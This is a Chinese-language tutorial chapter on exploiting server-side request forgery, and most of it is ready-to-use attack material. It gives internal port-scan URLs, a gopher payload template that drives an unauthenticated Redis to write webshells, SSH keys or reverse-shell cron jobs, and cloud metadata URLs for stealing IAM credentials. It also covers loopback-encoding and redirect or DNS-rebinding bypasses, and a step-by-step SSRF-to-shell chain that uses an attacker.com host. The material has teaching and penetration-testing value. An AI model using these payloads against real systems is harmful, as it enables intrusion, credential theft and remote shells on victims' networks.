# SSRF深入利用

### 3.1 SSRF利用场景

**内网端口扫描**

```
通过 SSRF 探测内网服务:
http://target.com/proxy?url=http://127.0.0.1:6379/
http://target.com/proxy?url=http://192.168.1.1:80/
http://target.com/proxy?url=http://10.0.0.1:3306/

判断方式:
- 端口开放: 返回正常响应或特定错误信息（如协议错误）
- 端口关闭: 连接超时或拒绝连接
- 响应时间差异: 开放端口响应快，关闭端口响应慢
```

**内网服务指纹识别**

不同服务在 HTTP 请求下返回不同的错误信息或 Banner：

```
Redis (6379):    -ERR wrong number of arguments
MySQL (3306):    返回特定版本握手包（非 HTTP）
FTP (21):        220 服务 Banner
SSH (22):        SSH-2.0-OpenSSH 协议标识
Memcached (11211): 非协议响应
```

**攻击内网Redis**

Redis 未授权访问是 SSRF 最常见的利用目标：

```
利用 gopher 协议发送 Redis 命令:
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$payload_len%0d%0a$payload%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$dir_len%0d%0a$dir%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$file_len%0d%0a$file%0d%0a*1%0d%0a$4%0d%0asave%0d%0a

利用方式:
1. 写入 Webshell 到 Web 目录（需知道路径）
2. 写入 SSH 公钥到 /root/.ssh/authorized_keys
3. 写入计划任务执行反弹 Shell
```

**云元数据接口**

云环境的元数据接口是 SSRF 的高价值目标：

```
AWS EC2 元数据 (169.254.169.254):
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
→ 可获取 IAM 临时凭证（AccessKey/SecretKey/Token）

GCP 元数据:
http://metadata.google.internal/computeMetadata/v1/
→ 需添加 Header: Metadata-Flavor: Google

Azure 元数据:
http://169.254.169.254/metadata/instance?api-version=2021-02-01
→ 需添加 Header: Metadata: true

阿里云:
http://100.100.100.200/latest/meta-data/
```

**gopher协议攻击内网**

gopher 协议可发送任意 TCP 数据包，是 SSRF 利用中最强大的协议：

```
gopher 协议格式:
gopher://target:port/_数据流（URL编码）

支持的攻击:
- gopher → Redis: 写文件/写公钥/写计划任务
- gopher → MySQL: 执行 SQL 语句（需知道用户名和加密握手）
- gopher → FastCGI: 利用未授权 FastCGI 执行 PHP 代码
- gopher → SMTP: 发送邮件/伪造发件人
```

### 3.2 SSRF绕过技术

**DNS Rebinding**

利用 DNS 解析的时间差，使服务端两次 DNS 查询解析到不同 IP：

```
攻击原理:
1. 攻击者注册域名 rebinding.attacker.com
2. 设置 DNS 服务器，第一次解析返回攻击者服务器 IP（通过校验）
3. 第二次解析返回 127.0.0.1（实际请求目标）
4. 服务端在两次 DNS 查询间未缓存或缓存时间极短

防御: 校验后立即请求、固定 IP 连接、DNS 缓存
```

**302跳转绕过**

利用受信任域名的 302 跳转功能跳转到内网地址：

```
攻击流程:
1. SSRF 校验白名单允许 target.com
2. target.com/redirect?url=http://127.0.0.1 返回 302 跳转
3. 服务端跟随跳转到 127.0.0.1

利用短网址服务的 302 跳转:
http://target.com/proxy?url=https://bit.ly/xxxxx
→ 302 → http://127.0.0.1:6379/
```

**URL编码与变形**

```
127.0.0.1 的多种表示:
http://127.0.0.1/
http://0x7f000001/          -- 十六进制
http://2130706433/          -- 十进制整数
http://017700000001/        -- 八进制
http://0177.00.00.01/       -- 混合八进制
http://[::1]/               -- IPv6 回环
http://0:0:0:0:0:0:0:1/    -- IPv6 完整形式
http://[::ffff:127.0.0.1]/  -- IPv4-mapped IPv6
http://127.1/               -- 简写
http://127.0.0.1.nip.io/   -- DNS 泛解析
```

### 3.3 SSRF漏洞链设计

```
SSRF → Redis → Shell 漏洞链:

步骤1: 发现 SSRF 漏洞
  http://target.com/proxy?url=http://attacker.com/

步骤2: 利用 SSRF 探测内网
  http://target.com/proxy?url=http://192.168.1.0/24  → 端口扫描

步骤3: 发现内网 Redis 未授权
  http://target.com/proxy?url=http://192.168.1.100:6379/
  → 返回 -ERR 或特定响应

步骤4: 利用 gopher 协议向 Redis 发送命令
  http://target.com/proxy?url=gopher://192.168.1.100:6379/_(Redis命令)
  → 写入 Webshell / SSH 公钥 / 计划任务

步骤5: 获取 Shell
  → 通过 Webshell 或 SSH 或计划任务反弹 Shell
```

---

---

